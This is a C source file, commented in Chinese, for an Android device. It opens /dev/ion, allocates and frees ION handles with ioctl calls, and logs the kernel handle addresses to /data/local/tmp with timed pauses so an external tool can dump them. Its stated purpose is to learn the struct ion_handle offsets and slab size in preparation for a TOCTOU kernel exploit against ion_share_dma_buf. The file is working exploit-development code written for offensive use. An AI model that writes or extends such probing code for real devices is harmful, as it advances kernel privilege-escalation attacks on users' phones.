/* SPDX-License-Identifier: GPL-3.0-or-later */

/*
 * ion_stage.c —— ION handle 布局分阶段取证（零风险：只 alloc / free，不碰竞态）
 *
 * 时序（每步之间留 8 秒，供 PC 侧用 ktool dump 读同一地址）：
 *   t=0   ALLOC h1                → 写 /data/local/tmp/ion_addr.txt
 *   t=8   FREE h1                 → 同上文件追加 freed 标记
 *   t=16  ALLOC h2, h3（观察复用与间距）
 *
 * 目的：拿 struct ion_handle 的字段偏移（ref/client/buffer/node）与 slab 尺寸，
 *       为后续 TOCTOU 利用（ion_share_dma_buf 锁外解引用 handle->buffer）做准备。
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/ioctl.h>

#define ION_IOC_MAGIC 'I'
struct ion_handle;
struct ion_allocation_data {
	size_t len;
	size_t align;
	unsigned int heap_mask;
	unsigned int flags;
	struct ion_handle *handle;
};
struct ion_handle_data {
	struct ion_handle *handle;
};
#define ION_IOC_ALLOC	_IOWR(ION_IOC_MAGIC, 0, struct ion_allocation_data)
#define ION_IOC_FREE	_IOWR(ION_IOC_MAGIC, 1, struct ion_handle_data)

#define ADDRF "/data/local/tmp/ion_addr.txt"

static int fd_ion;

static void emit(const char *fmt, ...)
{
	va_list ap;
	FILE *f = fopen(ADDRF, "a");

	if (!f)
		return;
	va_start(ap, fmt);
	vfprintf(f, fmt, ap);
	va_end(ap);
	fclose(f);
}

static struct ion_handle *alloc_one(unsigned int heap)
{
	struct ion_allocation_data d;

	memset(&d, 0, sizeof d);
	d.len = 4096;
	d.align = 0;
	d.heap_mask = 1u << heap;
	d.flags = 0;
	if (ioctl(fd_ion, ION_IOC_ALLOC, &d) != 0) {
		printf("[!] alloc heap=%u: %s\n", heap, strerror(errno));
		return NULL;
	}
	return d.handle;
}

static int free_one(struct ion_handle *h)
{
	struct ion_handle_data hd;

	memset(&hd, 0, sizeof hd);
	hd.handle = h;
	return ioctl(fd_ion, ION_IOC_FREE, &hd);
}

int main(void)
{
	struct ion_handle *h1, *h2, *h3;

	setvbuf(stdout, NULL, _IONBF, 0);
	unlink(ADDRF);

	fd_ion = open("/dev/ion", O_RDWR);
	if (fd_ion < 0) {
		printf("[!] open: %s\n", strerror(errno));
		return 1;
	}

	h1 = alloc_one(0);
	if (!h1)
		return 2;
	printf("S1 h1=%p (%#x)\n", (void *)h1, (unsigned int)(uintptr_t)h1);
	emit("S1 h1=%#x\n", (unsigned int)(uintptr_t)h1);
	sleep(9);

	printf("S2 FREE h1 -> %d (%s)\n", free_one(h1), strerror(errno));
	emit("S2 freed h1=%#x\n", (unsigned int)(uintptr_t)h1);
	sleep(9);

	h2 = alloc_one(0);
	h3 = alloc_one(0);
	if (h2 && h3) {
		printf("S3 h2=%#x h3=%#x delta=%d h2reuse=%s\n",
		       (unsigned int)(uintptr_t)h2, (unsigned int)(uintptr_t)h3,
		       (int)((uintptr_t)h3 - (uintptr_t)h2),
		       h2 == h1 ? "YES" : "no");
		emit("S3 h2=%#x h3=%#x delta=%d\n",
		     (unsigned int)(uintptr_t)h2, (unsigned int)(uintptr_t)h3,
		     (int)((uintptr_t)h3 - (uintptr_t)h2));
	}
	sleep(9);
	printf("DONE\n");
	return 0;
}
